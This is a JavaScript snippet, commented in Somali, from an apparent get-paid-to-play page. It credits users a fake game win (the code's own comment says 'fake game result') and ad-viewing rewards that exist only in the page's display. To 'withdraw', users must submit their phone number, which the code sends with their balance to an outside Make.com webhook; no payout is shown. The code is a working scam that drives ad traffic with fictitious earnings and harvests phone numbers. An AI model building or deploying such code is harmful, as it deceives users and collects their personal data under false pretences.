
<script>
    // Qaybta Game-ka (Sida loo ciyaaro)
    function playGame() {
        let confirmPlay = confirm("Ma rabtaa inaad ciyaarto Game-ka si aad u kasbato $2.00?");
        if (confirmPlay) {
            alert("Game-ku wuu socdaa... Fadlan sug...");
            // Waxaan samaynaynaa fake game result
            setTimeout(() => {
                let balEl = document.getElementById('balance');
                let newBal = parseFloat(balEl.innerText) + 2.00;
                balEl.innerText = newBal.toFixed(2);
                alert("Hambalyo! Waxaad ku guulaysatay $2.00.");
            }, 3000);
        }
    }

    // Qaybta Xayaysiiska (Monetag Direct Link)
    function watchAd() {
        window.open("https://omg10.com/4/11075110", "_blank");
        setTimeout(() => {
            let balEl = document.getElementById('balance');
            let newBal = parseFloat(balEl.innerText) + 5.50;
            balEl.innerText = newBal.toFixed(2);
            alert("Waad daawatay xayaysiiska! $5.50 ayaa laguugu daray.");
        }, 15000); // 15 ilbiriqsi
    }

    // Qaybta Withdraw
    async function sendWithdraw(method) {
        let b = document.getElementById('balance').innerText;
        let p = document.getElementById('phone').value;
        if (parseFloat(b) < 50) { alert("Waan ka xunnahay! Lacagta ugu yar waa $50."); return; }
        if (p.length < 5) { alert("Fadlan geli lambar sax ah."); return; }
        
        // Make.com Webhook
        const url = "https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41";
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ "Habka": method, "Lambarka": p, "Haraaga": b })
        });
        alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
    }
</script>
